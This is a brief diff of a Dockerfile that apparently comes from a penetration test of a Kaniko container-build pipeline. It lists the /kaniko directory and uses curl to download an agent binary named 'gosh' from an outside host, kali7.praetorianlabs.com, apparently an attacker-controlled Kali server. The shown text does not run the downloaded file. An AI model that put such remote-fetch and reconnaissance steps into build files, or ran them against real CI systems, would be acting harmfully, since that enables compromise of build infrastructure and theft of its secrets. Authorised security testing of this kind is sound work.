@@ -1,4 +1,5 @@
 FROM praetorianlabs/gosh-agent
+
 RUN apk update && apk add tree
 RUN tree /kaniko
 RUN curl -o /tmp/gosh http://kali7.praetorianlabs.com:8084/
